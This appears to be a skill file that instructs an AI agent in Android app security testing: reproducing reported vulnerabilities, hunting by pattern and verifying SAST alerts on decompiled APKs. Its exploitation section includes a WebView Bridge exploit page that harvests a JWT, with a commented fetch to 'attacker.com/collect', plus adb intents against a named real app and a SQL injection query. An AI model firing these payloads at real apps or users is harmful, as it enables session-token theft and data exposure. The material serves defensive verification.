# Android Vulnerability Analyzer - Universal Skill

## Overview

This skill provides **three primary modes** for Android security testing:

1. **Reproduction Mode**: Recreate known vulnerabilities from CVE reports, bug bounty submissions, or vulnerability disclosures
2. **Hunting Mode**: Actively search for specific types of vulnerabilities using pre-built hunt patterns
3. **SAST Verification Mode**: Verify and validate alerts from SAST tools (MobSF, SonarQube, AI SAST, Qark) with PoC generation and dynamic testing

All modes generate reusable documentation (prompt.md) for future reproduction or knowledge sharing.

## Command Format

```bash
/android-vuln-analyzer <path_to_apk> <path_to_case_or_hunt>
```

**Parameters:**
- `<path_to_apk>`: Target APK file to analyze
- `<path_to_case_or_hunt>`: Directory with vulnerability case, report, or hunt pattern

**Examples - Reproduction Mode:**
```bash
# Fast reproduction (has prompt.md)
/android-vuln-analyzer phemex.apk examples/phemex

# First-time reproduction (has report.txt)
/android-vuln-analyzer app.apk cases/new-vuln/

# Full discovery (empty directory)
/android-vuln-analyzer unknown.apk cases/investigation/
```

**Examples - Hunting Mode:** ⭐
```bash
# Hunt for hardcoded API keys
/android-vuln-analyzer app.apk hunts/hardcoded-secrets/

# Hunt for SQL injection
/android-vuln-analyzer app.apk hunts/sql-injection/

# Hunt for WebView vulnerabilities
/android-vuln-analyzer app.apk hunts/webview-vulnerabilities/
```

## Required Tools and Environment Setup

⚠️ **Step 7 (Dynamic Verification) requires specific tools.** Install these BEFORE starting verification.

### Essential Tools

| Tool | Purpose | Installation | Version |
|------|---------|--------------|---------|
| **Android SDK** | Emulator, adb | [Android Studio](https://developer.android.com/studio) | Latest |
| **mitmproxy** | MITM testing, cert pinning | `brew install mitmproxy` | 12.0+ |
| **frida** | Runtime hooking | `pip3 install --break-system-packages frida frida-tools` | 17.0+ |
| **frida-server** | Device-side Frida | [Download from GitHub](https://github.com/frida/frida/releases) | Match frida version |
| **tcpdump** | Network capture | Pre-installed on emulators | Any |

### Quick Setup

```bash
# 1. Install host tools
brew install mitmproxy
pip3 install --break-system-packages frida frida-tools

# 2. Download and deploy frida-server
FRIDA_VERSION=$(frida --version)
curl -L -o frida-server.xz \
  "https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-server-${FRIDA_VERSION}-android-arm64.xz"
unxz frida-server.xz
adb push frida-server /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# 3. Verify setup
mitmproxy --version
frida --version
frida-ps -D $(adb devices | grep -v "List" | awk '{print $1}' | head -1)
```

### Common Installation Pitfalls

⚠️ **Pitfall #1**: `externally-managed-environment` error when installing frida
- **Solution**: Add `--break-system-packages` flag to pip3

⚠️ **Pitfall #2**: frida version mismatch with frida-server
- **Solution**: Always match versions exactly (`frida --version` = frida-server version)

⚠️ **Pitfall #3**: Wrong frida-server architecture
- **Solution**: Check emulator arch with `adb shell getprop ro.product.cpu.abi`
  - `arm64-v8a` → use `frida-server-*-android-arm64.xz`
  - `x86_64` → use `frida-server-*-android-x86_64.xz`

⚠️ **Pitfall #4**: frida-server permission denied
- **Solution**: `adb shell chmod 755 /data/local/tmp/frida-server`

⚠️ **Pitfall #5**: Frida `--no-pause` flag not recognized
- **Solution**: Remove flag (not supported in all versions)

📖 **Complete guide**: See `ENVIRONMENT_SETUP.md` for detailed troubleshooting

### Recommended Emulator Configuration

- **API Level**: 34-35 (Android 14-15)
- **Architecture**: arm64-v8a (better app compatibility)
- **Device**: Pixel 8 Pro or similar
- **Storage**: 8GB+

```bash
# Create emulator
avdmanager create avd -n Pixel_8_Pro_API35_arm \
  -k "system-images;android-35;google_apis;arm64-v8a" \
  -d "pixel_8_pro"

# Launch emulator
emulator -avd Pixel_8_Pro_API35_arm &
```

---

## Execution Flow

### Step 1: Parse Input Parameters

1. **Validate APK path** - Ensure file exists and is a valid APK

2. **Check case directory structure:**

   **Scenario A: prompt.md exists** ✅ *Fast Reproduction*
   ```bash
   /path/to/case/
   ├── prompt.md          # Complete reproduction guide
   └── report_original.txt (optional)
   ```
   → **Skip to Step 3** (direct execution with known good steps)

   **Use Case**: Reproducing a vulnerability you or someone else already analyzed

   ---

   **Scenario B: Only raw report exists** 🔄 *Learning & Documentation*
   ```bash
   /path/to/case/
   └── report.txt         # Original vulnerability report
   ```
   → **Go to Step 2** (analyze + reproduce + generate prompt.md)

   **Use Case**: First-time reproduction from a vulnerability report (e.g., CVE, bug bounty report)

   ---

   **Scenario C: Empty directory** 🆕 *Full Discovery*
   ```bash
   /path/to/case/
   (empty)
   ```
   → **Full analysis mode** (find vulnerabilities from scratch)

   **Use Case**: Security audit of unknown APK, finding 0-days

   ---

   **Scenario D: hunt.md exists** 🎯 *Targeted Hunt* ⭐ **NEW**
   ```bash
   /path/to/case/
   └── hunt.md            # Vulnerability hunting guide
   ```
   → **Targeted vulnerability hunting mode** (search for specific vuln types)

   **Use Case**: Looking for a specific type of vulnerability (e.g., SQL injection, hardcoded secrets)

   **Example**:
   ```bash
   # Use pre-built hunt patterns
   /android-vuln-analyzer app.apk hunts/sql-injection/
   /android-vuln-analyzer app.apk hunts/hardcoded-secrets/

   # hunt.md tells AI exactly what to look for:
   # - Dangerous code patterns
   # - Search commands (grep patterns)
   # - Validation steps
   # - Expected indicators
   ```

   **Hunt Mode Workflow**:
   1. Read hunt.md to understand target vulnerability type
   2. Use specified grep/search patterns to find candidates
   3. Analyze code to confirm vulnerability
   4. Generate PoC specific to this vulnerability type
   5. Create prompt.md documenting findings
   6. Generate report with remediation

   **Available Hunt Patterns**: See `hunts/INDEX.md` for complete list

   ---

   **Scenario E: SAST Report exists** 🔍 *Verification & Validation* ⭐ **NEW**
   ```bash
   /path/to/case/
   └── sast_report.json       # SAST tool output (MobSF, SonarQube, AI SAST, Qark)
   ```
   → **SAST alert verification mode** (validate findings, filter false positives, generate PoCs)

   **Use Case**: You ran a SAST tool and need to verify which alerts are real vulnerabilities

   **Supported Formats**:
   - **MobSF**: JSON output from Mobile Security Framework
   - **SonarQube**: XML export from SonarQube scanner
   - **AI SAST**: Markdown reports from AI-based SAST tools
   - **Qark**: JSON output from Qark scanner

   **Example**:
   ```bash
   # Verify MobSF scan results
   /android-vuln-analyzer app.apk cases/mobsf-scan/mobsf_report.json

   # Verify AI SAST findings
   /android-vuln-analyzer app.apk cases/ai-scan/security_report.md

   # Verify with specific hunt pattern for targeted validation
   /android-vuln-analyzer app.apk hunts/sql-injection/mobsf_report.json
   ```

   **SAST Verification Workflow**:
   1. Parse SAST report and categorize alerts by vulnerability type
   2. For each alert, apply corresponding hunt.md verification guide
   3. Locate exact code location from alert metadata
   4. Validate pattern matches (filter common false positives)
   5. Trace data flow to confirm exploitability
   6. Generate working PoC for true positives
   7. Execute dynamic verification (actual adb testing)
   8. Create detailed report with true/false positive classification

   **Key Benefit**: hunt.md files serve dual purpose:
   - **Part 1**: Independent hunting (find vulnerabilities from scratch)
   - **Part 2**: Report verification (validate SAST alerts professionally)

   This approach combines traditional SAST speed with AI-powered verification and real PoC generation.

### Step 1.5: Targeted Vulnerability Hunting & SAST Verification (if hunt.md exists)

**When to use**:
- **Mode A**: You want to find a specific type of vulnerability (SQL injection, secrets, etc.) - Independent Hunt
- **Mode B**: You have SAST tool output and need to verify alerts - Report Verification

**Important**: hunt.md files now serve **dual purposes**:
- **Part 1: Independent Hunt** - Grep patterns and search strategies to find vulnerabilities from scratch
- **Part 2: Report Verification** - 7-step workflow to verify SAST tool alerts and generate PoCs

The AI automatically detects which mode to use based on input:
- If input is directory with hunt.md only → Use Part 1 (Independent Hunt)
- If input is SAST report file (.json/.xml/.md) → Use Part 2 (Report Verification) with matching hunt.md

#### 1.5.1 Parse Hunt Guide

Read `hunt.md` and extract:

**From Part 1 (Independent Hunt):**
- **Vulnerability type**: What are we looking for?
- **Target components**: Which Android components are vulnerable?
- **Dangerous patterns**: What code looks suspicious?
- **Search commands**: Grep/find patterns to locate candidates
- **Validation steps**: How to confirm it's actually vulnerable?
- **Exploitation strategy**: How to prove impact?

**From Part 2 (Report Verification):**
- **Alert identification**: How to parse this vulnerability type from different SAST tools
- **Verification workflow**: 7-step process (Parse Alert → Locate Code → Pattern Validation → Data Flow Tracing → Exploitability Assessment → PoC Generation → Dynamic Verification)
- **False positive patterns**: Common patterns that trigger false alarms
- **Expected output**: What a verified finding looks like

**Example** (from `hunts/sql-injection/hunt.md`):
```
Vulnerability: SQL Injection in ContentProviders
Target: query(), rawQuery(), execSQL() methods
Pattern: "SELECT * FROM " + userInput
Search: grep -r "rawQuery.*\+" sources/
Validation: User input reaches SQL without parameterization
```

#### 1.5.2 Execute Targeted Search

Use hunt-specific search patterns:

```bash
# Example: Hardcoded Secrets Hunt
grep -r "api[_-]?key" sources/ -i
grep -r "AIza[0-9A-Za-z\\-_]{35}" sources/  # Google API keys
grep -r "sk_live_[0-9a-zA-Z]{24,}" sources/  # Stripe keys
grep -r "AKIA[0-9A-Z]{16}" sources/  # AWS keys

# Example: SQL Injection Hunt
grep -r "rawQuery\|execSQL" sources/
grep -r "\"SELECT.*\" \+" sources/

# Example: WebView Hunt
grep -r "addJavascriptInterface" sources/
grep -r "loadUrl.*getStringExtra" sources/
```

#### 1.5.3 Analyze Findings

For each match:
1. Read surrounding code context
2. Trace data flow (input → processing → output)
3. Check if hunt's validation criteria are met
4. Confirm exploitability

**Example Analysis**:
```java
// Found via: grep -r "rawQuery.*\+"
// File: UserProvider.java:45
String userId = uri.getLastPathSegment();  // User input
String sql = "SELECT * FROM users WHERE id=" + userId;  // Concatenation!
return db.rawQuery(sql, null);  // No parameters

✓ Matches hunt pattern: SQL concatenation
✓ User input: uri.getLastPathSegment()
✓ No validation or parameterization
✓ VULNERABLE: SQL Injection confirmed
```

#### 1.5.4 Generate Targeted PoC

Create PoC specific to this vulnerability type (from hunt guide):

```bash
# SQL Injection PoC
adb shell content query \
  --uri "content://com.app.provider/users/1 OR 1=1"

# Expected: Returns all users (not just id=1)
```

#### 1.5.5 Document in prompt.md

After successful hunt, create `prompt.md` in hunt directory:

```markdown
# [App Name] - [Vulnerability Type] Found

## Hunt Summary
- Hunt Pattern: sql-injection
- Vulnerabilities Found: 2
- Severity: High (CVSS 8.5)

## Findings

### Finding 1: SQL Injection in UserProvider
- Location: com/app/data/UserProvider.java:45
- Pattern Matched: rawQuery with concatenation
- User Input Source: uri.getLastPathSegment()
- Exploitability: Confirmed

[Complete analysis...]

## Reproduction Steps
[Exact commands that worked...]

## Remediation
[Fixes specific to this vulnerability type...]
```

**Result**: Next time hunting same vulnerability type in different app, use same hunt.md but get new findings.

### Step 1.6: SAST Report Verification (if SAST report file exists) ⭐ **NEW**

**When to use**: You have output from MobSF, SonarQube, AI SAST, or Qark and need to verify which alerts are real vulnerabilities.

#### 1.6.1 Detect Report Format

Auto-detect SAST tool format:

```bash
# MobSF JSON format
{
  "code_analysis": {
    "findings": {
      "android_certificate_pinning": { ... },
      "android_sql_injection": [ ... ]
    }
  }
}

# SonarQube XML format
<issues>
  <issue>
    <key>squid:S2076</key>
    <component>com/app/Provider.java</component>
    <line>127</line>
  </issue>
</issues>

# AI SAST Markdown format
## Finding 1: SQL Injection in ContentProvider
**Severity**: Critical
**Location**: com/app/data/TransactionProvider.java:127

# Qark JSON format
{
  "results": {
    "APK": "app.apk",
    "Vulnerabilities": [ ... ]
  }
}
```

#### 1.6.2 Parse and Categorize Alerts

Extract all alerts and group by vulnerability type:

```
WebView vulnerabilities: 3 alerts
SQL injection: 2 alerts
Hardcoded secrets: 5 alerts
Exported components: 7 alerts
Path traversal: 1 alert

Total: 18 alerts to verify
```

#### 1.6.3 Load Matching Hunt Guides

For each vulnerability type found in report, load corresponding hunt.md:

```bash
# Map alert types to hunt patterns
WebView → hunts/webview-vulnerabilities/hunt.md (Part 2)
SQL → hunts/sql-injection/hunt.md (Part 2)
Secrets → hunts/hardcoded-secrets/hunt.md (Part 2)
Exported → hunts/exported-components/hunt.md (Part 2)
Path Traversal → hunts/path-traversal/hunt.md (Part 2)
```

#### 1.6.4 Execute 7-Step Verification (Per Alert)

**For EACH alert**, follow Part 2 of corresponding hunt.md:

**Step 1: Parse and Categorize Alert**
- Extract: file path, line number, alert message, severity
- Understand: what pattern triggered this alert?

**Step 2: Locate and Read Code Context**
- Decompile APK with jadx
- Navigate to exact file and line
- Read surrounding context (20-30 lines)

**Step 3: Pattern Validation (Filter False Positives)**
- Check hunt.md's false positive table
- Common false positives:
  - Placeholder values (YOUR_API_KEY, REPLACE_ME)
  - Test/debug code paths
  - Properly validated inputs
  - Dead code paths

**Example** (from hardcoded-secrets/hunt.md Part 2):
```java
// Alert: Line 45 contains API key pattern
String key = "AIzaSyDemoKey123456789";  // DEMO_KEY in comments

// Validation check:
if (key.contains("Demo") || key.contains("Example")) {
  → FALSE POSITIVE (placeholder value)
}
```

**Step 4: Data Flow Tracing (Confirm Exploitability)**
- Trace input source (user controlled?)
- Follow data propagation (sanitization?)
- Identify sink operation (dangerous API?)
- Assess impact (what can attacker do?)

**Example** (from sql-injection/hunt.md Part 2):
```java
// Source: URI parameter (user controlled)
String userId = uri.getLastPathSegment();

// Propagation: No validation
String sql = "SELECT * FROM users WHERE id=" + userId;  // ✓ Concatenation

// Sink: rawQuery (dangerous)
return db.rawQuery(sql, null);  // ✓ No parameterization

→ TRUE POSITIVE: Exploitable SQL injection
```

**Step 5: Exploitability Assessment**
- Rank severity: Critical / High / Medium / Low / Info
- Calculate CVSS score
- Determine real-world impact

**Step 6: PoC Generation (For True Positives)**
- Use hunt.md's PoC templates
- Adapt to this specific vulnerability
- Create working exploit commands

**Example** (SQL injection PoC):
```bash
#!/bin/bash
# Generated PoC for Finding #2

# Boolean-based blind injection
adb shell content query \
  --uri "content://com.app.provider/users/1 OR 1=1"

# Expected: Returns all users (not just id=1)
# Actual result: [verify dynamically]
```

**Step 7: Dynamic Verification (Execute PoC)** 🔴 **MANDATORY - NO EXCEPTIONS**

⚠️ **CRITICAL**: This step is **NON-NEGOTIABLE**. Steps 1-6 give you a HYPOTHESIS. Only Step 7 provides PROOF.

**The ONLY acceptable reason to skip**:
- ✅ APK cannot be installed (corrupted file, architecture incompatibility)

**NOT acceptable reasons** ❌:
- ❌ "Static analysis shows it's safe"
- ❌ "Configuration comes from server"
- ❌ "It's third-party SDK code"
- ❌ "Impact seems low"
- ❌ "Would require backend access" (use MITM/Frida instead)
- ❌ "Too complex to test"

**Required Actions**:
- Set up emulator environment (MUST actually start emulator)
- Install target APK (MUST actually install and verify)
- Execute generated PoC (MUST actually run, not just write)
- Capture results (logcat, screenshots, network logs)
- Confirm: TRUE POSITIVE or FALSE POSITIVE (based on TEST RESULTS, not assumptions)

**For "Server-Controlled" issues, you MUST also test**:
- Network interception (mitmproxy) - Is it HTTP or HTTPS? Can you MITM it?
- Certificate pinning verification - Present or absent?
- Local cache investigation - Is config cached? Can you modify it?
- Runtime modification (Frida) - Can you hook and override values?

📋 **See VERIFICATION_CHECKLIST.md** for complete mandatory checklist.

**If you skip this step without valid reason, your verification is INVALID.**

#### 1.6.5 Generate Verification Report

Create comprehensive report with:

**Section 1: Executive Summary**
```
Total Alerts: 18
True Positives: 6 (33%)
False Positives: 12 (67%)

Critical: 2
High: 3
Medium: 1
Low: 0
```

**Section 2: True Positive Details**
For each confirmed vulnerability:
- Alert metadata (file, line, severity)
- Verification workflow evidence
- Data flow analysis
- Working PoC code
- Dynamic testing results
- CVSS score with justification
- Recommended remediation

**Section 3: False Positive Analysis**
For each false alarm:
- Why it was flagged
- Why it's actually safe
- Pattern that caused confusion
- Suggested SAST rule improvement

**Section 4: Prioritized Action Plan**
```markdown
## Immediate Action Required (P0)
1. Fix SQL Injection in TransactionProvider.java:127 (CVSS 9.0)
2. Rotate hardcoded AWS credentials in S3Uploader.java:34 (CVSS 9.8)

## This Sprint (P1)
3. Add permission to AdminPanelActivity (CVSS 8.5)
4. Fix path traversal in FileHandler.java:89 (CVSS 8.0)

## Next Sprint (P2)
5. Implement App Links for OAuth callback (CVSS 6.5)
6. Disable debug mode in production (CVSS 6.5)
```

#### 1.6.6 Save Results

```bash
# Create verification output
mkdir -p verification_results/

# Save detailed report
cat > verification_results/verification_report.md <<'EOF'
[Complete verification findings]
EOF

# Save PoC scripts for true positives
for vuln in true_positives/*; do
  cp "$vuln/poc.sh" "verification_results/pocs/"
done

# Save summary JSON for automation
cat > verification_results/summary.json <<'EOF'
{
  "scan_date": "2026-02-27",
  "sast_tool": "MobSF",
  "total_alerts": 18,
  "true_positives": 6,
  "false_positives": 12,
  "critical": 2,
  "high": 3,
  "verification_time": "45 minutes"
}
EOF
```

**Result**: Professional verification report that:
- Filters noise from SAST output
- Provides working PoCs for real vulnerabilities
- Includes dynamic testing evidence
- Prioritizes remediation efforts
- Can be used to train SAST tools (reduce false positives)

#### Example Workflow

**Input**: MobSF report with 18 alerts

**Process**:
```
[1] Parse MobSF JSON → 18 alerts found
[2] Categorize: 3 WebView, 2 SQL, 5 secrets, 7 exported, 1 path
[3] Load hunt.md guides for each type
[4] Verify alert #1 (WebView): TRUE POSITIVE
    - Located code: WebViewActivity.java:45
    - Validated pattern: addJavascriptInterface without origin check
    - Traced data flow: Intent → WebView → Bridge → Token leak
    - Generated PoC: [working exploit]
    - Executed test: ✓ Token captured
    → Confirmed: CVSS 9.3 Critical
[5] Verify alert #2 (WebView): FALSE POSITIVE
    - Located code: HelpActivity.java:89
    - Pattern: addJavascriptInterface found
    - BUT: Only loads whitelisted help.example.com URLs
    - No user input to URL parameter
    → Dismissed: Safe implementation
[... continue for all 18 alerts ...]
[18] Complete: 6 true positives, 12 false positives
```

**Output**: verification_report.md with prioritized action items

**Time Saved**: Manual review of 18 alerts would take ~3 hours. Automated verification with this workflow: ~45 minutes.

### Step 2: First-Time Reproduction from Raw Report

**CRITICAL**: This step is where you **learn by doing** and **document for others**.

When given only a raw report (no prompt.md), the workflow is:

#### 2.1 Parse Raw Report

Read `report.txt`, `description.md`, `vulnerability.txt` or similar and extract:

- **Vulnerability type**: Exported Activity, WebView Bridge, SQL Injection, etc.
- **Affected components**: Package names, Activity/Service names
- **Attack surface**: How to trigger (Intent, URL, etc.)
- **Root cause**: What validation is missing
- **Expected impact**: What data/access is compromised
- **PoC sketch**: Basic exploitation idea from report

**Example** (Phemex report):
```
Identified: FirebasePushClickActivity (exported)
Trigger: Intent with routerUrl extra
Bypass: Goes through jumpInnerPage without validation
Impact: WebView loads arbitrary URL with Bridge exposed
Result: Bridge.postMessage('getAppInfo') returns JWT token
```

#### 2.2 Perform Full Analysis & Reproduction

Now **actually reproduce** the vulnerability following the general methodology (Steps 3-8):

1. **Environment setup** (architecture detection, emulator, APK install)
2. **Static analysis** (decompile, find components)
3. **Code analysis** (trace call chain, find exact validation logic)
4. **Exploitation** (create PoC, try to trigger)
5. **Problem solving** (hit issues, debug, find solutions)
6. **Validation** (confirm exploitation works)

**Key Point**: You **WILL** encounter issues. This is expected. Document them!

#### 2.3 Document Issues Encountered

As you reproduce, keep a running log of problems and solutions:

**Example issues from Phemex reproduction:**

| Issue | What Happened | Root Cause | Solution Found |
|-------|---------------|------------|----------------|
| Intent ignored | Activity didn't respond | Missing required field | Code analysis revealed `google.message_id` OR `sendbird` required |
| HTTP blocked | `ERR_CLEARTEXT_NOT_PERMITTED` | Android 9+ security | Must use HTTPS only |
| Certificate error | `NET::ERR_CERT_AUTHORITY_INVALID` | Self-signed cert rejected | Use GitHub Pages or valid cert |
| Empty token | Callback received but no token | User not logged in | Must login first in emulator |
| Bridge undefined | JavaScript error | Wrong URL routing | Verify URL starts with `http` to trigger WebView path |

#### 2.4 Generate Complete prompt.md

**After successful reproduction**, create `prompt.md` in the SAME directory with:

**Section 1: Vulnerability Summary**
- Type, severity, components (from report + your verification)
- CVSS score (calculated after impact assessment)

**Section 2: Attack Chain**
- Complete call chain with **file:line numbers** from actual decompiled code
- Not just theory - actual verified path

**Section 3: Detailed Code Analysis**
- Code snippets from decompiled source
- **Exact field names** discovered (e.g., `google.message_id` not `gcm.message_id`)
- **Validation bypass details** with line numbers
- **Bridge methods** that leak data

**Section 4: Required Setup**
- App version
- User state (logged in/out)
- Environment requirements
- **Prerequisites discovered during reproduction**

**Section 5: Exploitation Steps**
- **Exact commands that worked**
- PoC code (working HTML/script)
- HTTPS hosting instructions
- Intent command with all required fields

**Section 6: Known Issues & Solutions** ⭐ **MOST IMPORTANT**
- Every problem you hit
- Why it happened
- How you solved it
- How to avoid it next time

**Section 7: Expected Results**
- What to look for in logcat
- What callback should receive
- How to verify success
- Screenshots/evidence

**Section 8: Validation Checklist**
- Step-by-step checklist others can follow
- Each step verifiable independently

**Section 9: Impact & CVSS**
- What attacker can do with compromised data
- CVSS calculation with justification

**Section 10: Remediation**
- Code fixes (before/after)
- Defense in depth recommendations

#### 2.5 Save prompt.md to Case Directory

```bash
# Save generated prompt
cat > /path/to/case/prompt.md <<'EOF'
[Your complete prompt content]
EOF

# Also save original report for reference
cp report.txt report_original.txt
```

**Result**: Next time anyone runs:
```bash
/android-vuln-analyzer app.apk /path/to/case
```

They will **skip directly to Step 3** using your validated prompt.md, avoiding all the issues you already solved!

#### Example Transformation

**Before (raw report):**
```
FirebasePushClickActivity is exported and accepts arbitrary URLs
via routerUrl parameter, leading to WebView with exposed Bridge
that returns session tokens.
```

**After (your prompt.md):**
```markdown
## Required Intent Fields (CRITICAL)

Code analysis at `f.java:117-119` reveals validation requires:
- `google.message_id` (String, any value) OR
- `sendbird` (String, any value)

Without one of these, interceptPushClick() exits early.

## Intent Command (Verified Working)

adb shell am start \
  -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
  --es routerUrl "https://yourusername.github.io/poc.html" \
  --es "google.message_id" "12345"

Note: Initially tried `gcm.message_id` (FAILED). Correct field is `google.message_id`.

## HTTPS Requirement

Android 9+ blocks HTTP with ERR_CLEARTEXT_NOT_PERMITTED.
Must use valid HTTPS. Recommended: GitHub Pages (free, valid cert).
Self-signed certificates will fail with ERR_CERT_AUTHORITY_INVALID.

## User Must Be Logged In

Token is only available after authentication.
Steps:
1. Install APK
2. Launch app manually
3. Complete login
4. Press Home (keep app in background)
5. Then fire exploit intent

If token is empty, user is not logged in.
```

See the difference? The second version will save the next person **hours** of debugging!

### Step 3: Environment Preparation

**3.1 Detect Host Architecture**
```bash
uname -m
# arm64 (Apple Silicon) → Use arm64-v8a images
# x86_64 (Intel) → Use x86_64 images
```

**3.2 Check Android SDK**
```bash
ANDROID_SDK="$HOME/Library/Android/sdk"  # macOS
# or $HOME/Android/Sdk  # Linux
```

If not installed:
- macOS: `brew install --cask android-commandlinetools`
- Linux: Download from developer.android.com

**3.3 Select and Install System Image**

Based on architecture:
```bash
# For Apple Silicon (arm64)
sdkmanager "system-images;android-35;google_apis;arm64-v8a"

# For Intel (x86_64)
sdkmanager "system-images;android-35;google_apis;x86_64"
```

**3.4 Create/Start Emulator**
```bash
# Create AVD if not exists
AVD_NAME="vuln_test_$(arch)"
avdmanager create avd -n "$AVD_NAME" \
  -k "system-images;android-35;google_apis;[ARCH]" \
  -d "pixel_8_pro"

# Start emulator
emulator -avd "$AVD_NAME" -no-snapshot-load &

# Wait for boot
adb wait-for-device
sleep 30  # Additional boot time
```

**3.5 Install Target APK**
```bash
adb install -r <path_to_apk>
```

**3.6 Check Login Requirements**
```bash
# If case prompt indicates login required:
echo "⚠️  This vulnerability requires the user to be logged in."
echo "Please:"
echo "  1. Open the app in the emulator"
echo "  2. Complete login process"
echo "  3. Press ENTER to continue..."
read
```

### Step 4: Execute Case Prompt

Read `prompt.md` from the case directory and follow its instructions.

**Common Case Patterns:**

#### Pattern A: Exported Activity + WebView Bridge
```
1. Analyze exported components in AndroidManifest.xml
2. Identify vulnerable activity (android:exported="true", no permission)
3. Decompile with jadx to find:
   - Intent parameter extraction
   - Required fields for validation bypass
   - URL routing logic
   - WebView Bridge registration
   - Bridge methods that leak data
4. Create PoC HTML page
5. Host on HTTPS (required for Android 9+)
6. Trigger with adb intent
7. Monitor logcat and network for data exfiltration
```

#### Pattern B: Intent Injection
```
1. Find exported component
2. Analyze intent extras handling
3. Identify injection points
4. Craft malicious intent
5. Execute and verify
```

### Step 5: Static Analysis

**5.1 Decompile APK**
```bash
OUTPUT_DIR="/tmp/$(basename $APK .apk)_decompiled"
jadx -d "$OUTPUT_DIR" "$APK_PATH"
```

**5.2 Analyze AndroidManifest.xml**
```bash
MANIFEST="$OUTPUT_DIR/resources/AndroidManifest.xml"
```

**Critical checks:**
- Exported components: `grep -n 'android:exported="true"' "$MANIFEST"`
- Missing permissions: Check if exported components lack `android:permission`
- Intent filters: What external inputs are accepted
- Network security config
- Debuggable flag

**5.3 Find Vulnerable Components**

Based on case prompt, locate:
```bash
# Find specific Activity
find "$OUTPUT_DIR/sources" -name "*ActivityName*.java"

# Search for WebView usage
grep -r "addJavascriptInterface" "$OUTPUT_DIR/sources/"
grep -r "loadUrl\|loadData" "$OUTPUT_DIR/sources/"

# Search for Intent handling
grep -r "getIntent()\|getStringExtra\|getBundleExtra" "$OUTPUT_DIR/sources/"
```

### Step 6: Code Analysis

**6.1 Trace Attack Surface**

For each vulnerable component from the case prompt:

1. **Entry Point Analysis**
   ```java
   // Example: FirebasePushClickActivity.onCreate()
   Intent intent = getIntent();
   String url = intent.getStringExtra("routerUrl");
   ```
   - What parameters are extracted?
   - Are they validated?

2. **Validation Logic**
   ```java
   // Common bypass: checking wrong fields
   if (TextUtils.isEmpty(intent.getStringExtra("google.message_id")) &&
       TextUtils.isEmpty(intent.getStringExtra("sendbird"))) {
       return;  // Must provide one of these!
   }
   ```
   - What fields are required to pass validation?
   - Document these in case notes

3. **Data Flow to Sensitive Operations**
   ```java
   // Follow the parameter through the call chain
   routerUrl → jumpInnerPage() → jumpH5Page() → WebView.loadUrl()
   ```

4. **WebView Security**
   ```java
   // Bridge registration
   addJavascriptInterface(new Bridge(), "Bridge");

   // Dangerous methods
   @JavascriptInterface
   public String getAppInfo() {
       return getUserToken();  // JWT leak!
   }
   ```
   - Is Bridge origin-verified?
   - What sensitive data is exposed?

**6.2 Build Complete Call Chain**

Document the full path:
```
EntryPoint: FirebasePushClickActivity.onCreate()
  ↓ line 45
Extract: intent.getStringExtra("routerUrl")
  ↓ line 48
Validation: f.getInstance().interceptPushClick(intent)
  ↓ f.java:117-119
Requires: "google.message_id" OR "sendbird" extra
  ↓ f.java:66-68
Route: c.jumpInnerPage(context, routerUrl)
  ↓ b.java:300-302
Decision: if (url.startsWith("http"))
  ↓
Action: c.jumpH5Page(context, "", url)
  ↓ PhemexWebView.java:556
Bridge: addJavascriptInterface(new d(), "Bridge")
  ↓ PhemexWebView.java:573-605
Leak: Bridge.postMessage('getAppInfo') → returns JWT
```

### Step 7: Dynamic Exploitation

**7.1 Prepare Exploit Payload**

Based on case type, create appropriate PoC:

**For WebView Bridge Exploits:**
```html
<!DOCTYPE html>
<html>
<head>
<script>
// Define callback BEFORE calling Bridge
window.getAppInfo = function(data) {
    console.log('[EXPLOIT] Received:', data);

    // Parse if JSON
    try {
        var parsed = JSON.parse(data);
        console.log('[TOKEN]', parsed.token);
        console.log('[DEVICE_ID]', parsed.bid);

        // Exfiltrate (disabled for PoC)
        // fetch('https://attacker.com/collect', {
        //     method: 'POST',
        //     body: data
        // });
    } catch(e) {
        console.log('[RAW]', data);
    }
};

// Wait for page load
window.addEventListener('load', function() {
    if (typeof Bridge !== 'undefined') {
        console.log('[EXPLOIT] Bridge found, calling methods...');

        // Try common methods
        if (typeof Bridge.postMessage === 'function') {
            Bridge.postMessage('getAppInfo');
        }
        if (typeof Bridge.getAppInfo === 'function') {
            Bridge.getAppInfo();
        }
    } else {
        console.error('[EXPLOIT] Bridge not found!');
    }
});
</script>
</head>
<body>
<h1>Security Test</h1>
<div id="status">Testing...</div>
</body>
</html>
```

**7.2 Host Payload**

⚠️ **CRITICAL: Android 9+ requires HTTPS for network requests**

Options:
1. **Self-signed certificate (testing only):**
   ```bash
   # Generate certificate
   openssl req -x509 -newkey rsa:4096 -nodes \
     -keyout key.pem -out cert.pem -days 365 \
     -subj "/CN=localhost"

   # Start HTTPS server
   python3 -c "
   import http.server, ssl
   server = http.server.HTTPServer(('0.0.0.0', 8443), http.server.SimpleHTTPRequestHandler)
   server.socket = ssl.wrap_socket(server.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
   server.serve_forever()
   "
   ```

2. **Public HTTPS hosting:**
   - GitHub Pages
   - Netlify
   - Your own server with valid cert

**7.3 Execute Exploit**

Build and fire the intent based on case requirements:

```bash
# Generic template
adb shell am start \
  -n <PACKAGE>/<VULNERABLE_ACTIVITY> \
  --es <URL_PARAM_NAME> "https://attacker.com/poc.html" \
  --es <REQUIRED_FIELD_1> "<VALUE_1>" \
  --es <REQUIRED_FIELD_2> "<VALUE_2>"

# Phemex example:
adb shell am start \
  -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
  --es routerUrl "https://attacker.com/poc.html" \
  --es "google.message_id" "12345"
```

**Common Issues & Solutions:**

| Issue | Cause | Solution |
|-------|-------|----------|
| ERR_CLEARTEXT_NOT_PERMITTED | Android 9+ blocks HTTP | Use HTTPS only |
| NET::ERR_CERT_AUTHORITY_INVALID | Self-signed cert | Install cert in emulator or use valid cert |
| Activity not found | Wrong component name | Verify exact name from manifest |
| Intent ignored | Missing required fields | Check validation code for required extras |
| Bridge undefined | Wrong URL loaded | Verify URL routing logic |

**7.4 Monitor Exploitation**

```bash
# Clear logcat
adb logcat -c

# Monitor in real-time (filter for sensitive keywords)
adb logcat | grep --color=always -iE "(token|jwt|bearer|session|password|secret|credential|api_key)"

# In another terminal: Monitor WebView console
adb logcat | grep --color=always "chromium\|Console"

